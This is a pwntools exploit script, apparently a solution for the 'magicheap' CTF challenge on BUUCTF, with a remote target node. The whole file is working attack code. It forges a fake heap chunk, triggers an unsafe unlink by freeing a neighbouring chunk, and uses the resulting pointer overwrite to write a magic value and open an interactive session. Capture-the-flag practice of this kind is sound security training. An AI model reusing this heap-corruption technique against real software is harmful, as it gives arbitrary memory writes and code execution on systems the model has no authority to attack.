import sys
from pwn import *
from ctypes import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./magicheap')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./magicheap')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
		else :
			io=remote('node3.buuoj.cn',26251)
			elf=ELF('./magicheap')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]

		def add(a,c):
			io.sendlineafter('Your choice :','1')
			io.sendlineafter('Size of Heap : ',str(a))
			io.sendafter('Content of heap:',c)

		def delete(a):
			io.sendlineafter('Your choice :','3')
			io.sendlineafter('Index :',str(a))

		def edit(a,b,c):
			io.sendlineafter('Your choice :','2')
			io.sendlineafter('Index :',str(a))
			io.sendlineafter('Size of Heap : ',str(b))
			io.sendafter('Content of heap : ',c)

		

		add(0x60,'aaaa\n')
		add(0xf0,'aaaa\n')
		# add(0xf0,'aaaa\n')
		chunk_1_addr=0x6020C0
		edit(0,0x70,p64(0)+p64(0x61)+p64(chunk_1_addr-0x18)+p64(chunk_1_addr-0x10)+'\x00'*0x40+p64(0x60)+p64(0x100))
		delete(1)
		edit(0,0x20,'\x00'*0x18+p64(chunk_1_addr-0x20))
		edit(0,0x8,'aaaaaa')
		io.sendline(str(0x1305))





		# success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue